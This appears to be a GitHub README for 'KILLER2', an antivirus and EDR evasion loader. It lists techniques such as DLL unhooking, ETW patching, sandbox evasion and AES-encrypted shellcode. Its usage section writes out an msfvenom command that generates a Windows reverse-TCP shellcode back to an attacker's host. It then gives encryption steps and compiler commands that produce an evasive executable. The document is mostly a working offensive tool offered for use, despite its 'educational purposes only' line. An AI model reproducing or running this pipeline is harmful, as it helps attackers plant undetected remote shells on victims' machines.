# KILLER2 TOOL (EDR Evasion)
It's a AV/EDR Evasion tool created to bypass security tools for learning.

# Features:

* Module Stomping for Memory scanning evasion
* DLL Unhooking by fresh ntdll copy
* IAT Hiding and Obfuscation & API Unhooking
* ETW Patchnig for bypassing some security controls
* Included sandbox evasion techniques & Basic Anti-Debugging
* Fully obfuscated (Functions - Keys - Shellcode) by XOR'ing
* Shellcode reversed and Encrypted w/AES
* Moving payload into hallowed memory without using APIs 
* GetProcAddress & GetModuleHandle Implementation by @cocomelonc
* Runs without creating new thread & Supports x64

# How to use it

Generate your shellcode with msfvenom tool or any other C2 generated BIN file:

 * msfvenom -p windows/x64/custom/reverse_tcp LHOST<IP> LPORT<PORT> -f raw -o payload.bin

* py3 encryptor.py payload.bin > produces payload.h

* py3 reverse_shellcode.py --header payload.h > produces shellcode_recovered.bin

* py3 encryptor.py shellcode_recovered.bin > produces production payload.h

* Windows x64 Native Tools: cl /EHsc killer_aes.cpp Shlwapi.lib psapi.lib

* Linux: x86_64-w64-mingw32-g++ -O2 -static -s -fpermissive -o killer.exe killer_aes.cpp -lshlwapi -lpsapi





# Important Notes

* First thanks to [Abdallah Mohammed](https://github.com/abdallah-elsharif) for helping me to develop it. 
* Second, I just altered it!
* The tool is for educational purposes only
